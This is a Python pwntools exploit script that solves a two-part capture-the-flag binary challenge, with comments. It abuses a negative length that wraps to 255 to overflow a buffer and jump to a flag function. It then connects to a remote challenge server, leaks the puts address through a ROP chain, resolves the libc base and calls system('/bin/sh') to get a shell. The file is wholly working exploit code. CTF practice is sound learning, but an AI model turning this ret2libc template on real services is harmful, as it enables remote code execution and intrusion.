from pwn import *

# My ctf library, you can probably code these functions yourself
from ctflib.pwn import fetch_libc_ver, download_libc

e = ELF("chal")
context.binary = e
p = e.process()
# First part, send -1 for the length. This is 0xffffffff (-1 in 32 bit 2's complement as an integer)
# When it's cast to an unsigned char, it becomes 0xff, which is 255, allowing us to BOF
p.sendline(b"-1")
p.sendline(b"a"*40 + p64(e.sym.flag1))
p.recvuntil("XD\n")
p.sendline("cat flag.txt")
recv = p.recvline(keepends=False)
assert recv == b"flag{twos_complement_moment}", recv
print("Got flag", recv)
# Part 2: Ret2libc 
# Pretty standard and basic attack, quite important actually
p = remote("35.240.143.82",4202)

# First we need to know which libc version the server is using,
# so we leak the GOT (real address) puts by calling the PLT of puts to print the GOT of puts
rop = ROP(e)
rop.call(e.plt.puts, (e.got.puts,))
# Call back to main, we have more stuff to do
rop.call(e.sym.main)
p.sendline(b"-1")
p.sendline(b"a"*40 + rop.chain())
p.recvuntil("XD\n")
# Hopefully we leak an address
leak = p.recvline(keepends=False)
# Pad to 8 bytes
leak = u64(leak + b"\0\0")
print("leak:",hex(leak))
# It's libc6_2.31-13_amd64
# print(fetch_libc_ver(leak))
# Grab libc
libc = ELF(download_libc("libc6_2.31-13_amd64"), checksec=False)
# Set libc base
libc.address = leak - libc.sym.puts
assert hex(libc.address)[-3:] == "000", "Libc not 12 bit aligned"
print("libc base",hex(libc.address))

# Ok, now we've got all the ingredient for a ret2libc or one gadget. I'll just do ret2libc
sys = libc.symbols.system
sh = next(libc.search(b"/bin/sh"))
rop2 = ROP(e)
# We basically call system("/bin/sh")
rop2.call(sys, (sh,))
p.sendline(b"-1")
p.sendline(b"a"*40+rop2.chain())
# And we should have a shell!
p.recvuntil("XD\n")
p.sendline("cat flag.txt")
recv = p.recvline(keepends=False)
assert recv == b"flag{youre_a_rop_master!}", recv
print("Got flag2", recv)


